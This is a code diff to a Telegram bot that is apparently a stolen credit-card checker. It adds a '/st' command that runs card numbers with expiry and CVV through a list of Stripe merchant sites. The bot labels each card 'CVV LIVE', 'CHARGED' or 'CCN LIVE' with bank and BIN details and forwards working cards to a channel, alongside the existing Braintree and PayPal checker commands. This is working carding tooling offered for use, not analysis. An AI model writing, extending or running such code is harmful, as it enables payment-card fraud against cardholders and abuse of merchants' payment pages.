@@ -672,6 +672,45 @@ def remove_paypalpro_site(site_url):
         return True
     return False
 
+# ============= STRIPE SITES FUNCTIONS =============
+
+def load_stripe_sites():
+    """Load Stripe sites from stripe/sites.txt"""
+    sites = []
+    sites_file = 'stripe/sites.txt'
+    if os.path.exists(sites_file):
+        with open(sites_file, 'r') as f:
+            sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+    return sites
+
+def save_stripe_sites(sites):
+    """Save Stripe sites to stripe/sites.txt"""
+    sites_file = 'stripe/sites.txt'
+    os.makedirs('stripe', exist_ok=True)
+    with open(sites_file, 'w') as f:
+        for site in sites:
+            if site.strip():
+                f.write(site.strip() + '\n')
+    return True
+
+def add_stripe_site(site_url):
+    """Add a site to Stripe sites"""
+    sites = load_stripe_sites()
+    if site_url not in sites:
+        sites.append(site_url)
+        save_stripe_sites(sites)
+        return True
+    return False
+
+def remove_stripe_site(site_url):
+    """Remove a site from Stripe sites"""
+    sites = load_stripe_sites()
+    if site_url in sites:
+        sites.remove(site_url)
+        save_stripe_sites(sites)
+        return True
+    return False
+
 # ============= MASS SETTINGS FUNCTIONS =============
 
 def load_mass_settings():
@@ -1720,6 +1759,7 @@ Commands:
 /b3s <cards> - Check multiple cards (Braintree Auth)
 /pp <card/cards> - Check single or multiple cards (PPCP Gateway)
 /pro <card/cards> - Check single or multiple cards (PayPal Pro Gateway)
+/st <card> - Check a single card (Stripe Charge Gateway)
 """
     
     # Add disabled mass check notice if any gateways are disabled
@@ -1745,6 +1785,7 @@ Single Card Examples:
 /b3 5156123456789876|11|29|384
 /pp 4315037547717888|10|28|852
 /pro 4315037547717888|10|28|852
+/st 4315037547717888|10|28|852
 
 Mass Check Examples:
 /b3s 5401683112957490|10|2029|741
@@ -2514,6 +2555,194 @@ async def pro_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         finally:
             # Always unregister the mass check when done
             unregister_mass_check(user_id)
+
+
+async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /st command for Stripe CVV card checking with rate limiting"""
+    user_id = update.effective_user.id
+    is_admin = user_id == ADMIN_ID
+
+    # Check if user is admin or approved
+    if not is_admin and not is_user_approved(user_id):
+        await update.message.reply_text(
+            "❌ You don't have access to use this bot.\n"
+            f"Your User ID: `{user_id}`\n\n"
+            "Please contact @TUMAOB for approval.",
+            parse_mode='Markdown'
+        )
+        return
+
+    # Rate limiting check (thread-safe)
+    if not is_admin:
+        with user_rate_limit_lock:
+            current_time = time.time()
+            last_check_time = user_rate_limit.get(user_id, 0)
+            time_since_last_check = current_time - last_check_time
+
+            if time_since_last_check < RATE_LIMIT_SECONDS:
+                wait_time = RATE_LIMIT_SECONDS - time_since_last_check
+                await update.message.reply_text(
+                    f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
+                    "This prevents overloading the system."
+                )
+                return
+
+            # Update last check time
+            user_rate_limit[user_id] = current_time
+
+    # Check if card details are provided
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Please provide card details.\n\n"
+            "Format: /st number|mm|yy|cvv\n"
+            "Example: /st 4315037547717888|10|28|852"
+        )
+        return
+
+    card_details = ' '.join(context.args)
+
+    # Validate card format
+    if card_details.count('|') != 3:
+        await update.message.reply_text(
+            "❌ Invalid card format.\n\n"
+            "Format: /st number|mm|yy|cvv\n"
+            "Example: /st 4315037547717888|10|28|852"
+        )
+        return
+
+    # Send "Checking Please Wait" message
+    checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")
+
+    try:
+        # Load Stripe sites
+        sites = load_stripe_sites()
+        
+        if not sites:
+            await checking_msg.edit_text("❌ No Stripe sites configured! Please add sites to stripe/sites.txt")
+            return
+
+        # Import and use the Stripe CVV checker
+        sys.path.append(os.path.join(os.path.dirname(__file__), 'stripe'))
+        from stripe import allstripecvv
+        
+        # Convert sites list to comma-separated string
+        sites_str = ','.join(sites)
+        
+        # Track start time
+        start_time = time.time()
+        
+        # Run the card check in executor to not block
+        loop = asyncio.get_event_loop()
+        raw_result = await loop.run_in_executor(
+            None, 
+            lambda: allstripecvv.process_card(card_details, sites_str)
+        )
+        
+        elapsed_time = time.time() - start_time
+        
+        # Parse card details
+        parts = card_details.strip().split('|')
+        cc = parts[0]
+        mm = parts[1]
+        yy = parts[2] if len(parts[2]) == 4 else f"20{parts[2]}"
+        cvv = parts[3]
+        
+        # Get BIN info
+        bin_info = get_bin_info(cc[:6]) or default_bin_info()
+        
+        # Parse the raw result to extract response and price
+        response_text = ""
+        price = ""
+        
+        # Extract price from result
+        if "AMOUNT:" in raw_result:
+            try:
+                price_match = re.search(r'AMOUNT:([^\]]+)', raw_result)
+                if price_match:
+                    price = price_match.group(1).strip()
+            except:
+                price = ""
+        
+        # Determine status and format response
+        is_cvv = False
+        is_ccn = False
+        is_declined = False
+        reason = ""
+        
+        if "#CVV" in raw_result:
+            is_cvv = True
+            # Extract reason
+            if "Insufficient Funds" in raw_result:
+                reason = "Insufficient Funds ✅"
+            elif "CHARGED" in raw_result:
+                reason = "CHARGED CVV ✅"
+            else:
+                reason = "CVV LIVE ✅"
+        elif "#CCN" in raw_result:
+            is_ccn = True
+            if "Security Code" in raw_result or "security code" in raw_result:
+                reason = "CCN LIVE (Security Code Incorrect) ✅"
+            elif "3ds" in raw_result.lower():
+                reason = "CCN LIVE (3DS Required) ✅"
+            else:
+                reason = "CCN LIVE ✅"
+        elif "#DEAD" in raw_result or "#ERROR" in raw_result:
+            is_declined = True
+            # Extract decline reason
+            if "DECLINED" in raw_result:
+                reason = "DECLINED ❌"
+            elif "card was declined" in raw_result.lower():
+                reason = "Card Declined ❌"
+            elif "NONCE ERROR" in raw_result:
+                reason = "Nonce Error ❌"
+            elif "Payment processing failed" in raw_result:
+                reason = "Payment Processing Failed ❌"
+            else:
+                # Try to extract the reason from brackets
+                bracket_match = re.search(r'#(?:DEAD|ERROR)\s*\[([^\]]+)\]', raw_result)
+                if bracket_match:
+                    reason = f"{bracket_match.group(1)} ❌"
+                else:
+                    reason = "DECLINED ❌"
+        else:
+            # Default to declined if unknown
+            is_declined = True
+            reason = "Unknown Response ❌"
+        
+        # Format the response according to user's requirements
+        if is_cvv or is_ccn:
+            status_emoji = "✅"
+            status_text = "CVV" if is_cvv else "CCN"
+        else:
+            status_emoji = "❌"
+            status_text = "DECLINED"
+        
+        formatted_result = f"""{status_text} {status_emoji}
+
+𝗖𝗖 ⇾ {cc}|{mm}|{yy}|{cvv}
+𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge {f'"{price}"' if price else ''}
+𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
+
+𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+
+𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+
+𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB
+"""
+
+        # Edit the message with the result
+        await checking_msg.edit_text(formatted_result)
+
+        # Forward to channel if approved (CVV or CCN)
+        if is_cvv or is_ccn:
+            await forward_to_channel(context, card_details, formatted_result, gateway='b3')
+
+    except Exception as e:
+        error_message = f"❌ Error checking card: {str(e)}"
+        await checking_msg.edit_text(error_message)
+        print(f"Error in /st command: {str(e)}")
 
 
 async def admin_menu_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -6253,6 +6482,7 @@ def main():
     application.add_handler(CommandHandler("b3s", b3s_command))
     application.add_handler(CommandHandler("pp", pp_command))
     application.add_handler(CommandHandler("pro", pro_command))
+    application.add_handler(CommandHandler("st", st_command))
     application.add_handler(CommandHandler("approve", approve_command))
     application.add_handler(CommandHandler("admin", admin_menu_command))
     application.add_handler(CommandHandler("remove", remove_user_command))
